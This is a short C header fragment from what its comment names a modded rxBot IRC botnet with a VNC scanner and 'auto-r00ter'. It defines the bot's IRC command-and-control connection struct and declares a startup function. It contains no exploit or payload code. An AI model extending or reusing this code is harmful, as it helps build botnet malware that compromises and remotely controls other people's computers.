/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


// irc/spy structure.
typedef struct IRC 
{
	SOCKET sock;
	char host[MAXHOSTNAME];
	char channel[MAXCHANLEN];
	char chanpass[MAXCHANLEN];
	char nick[MAXNICKLEN];
	unsigned short port;
	int clone;
	int threadnum;
	BOOL gotinfo;

} IRC;

int IRC_Startup(void);
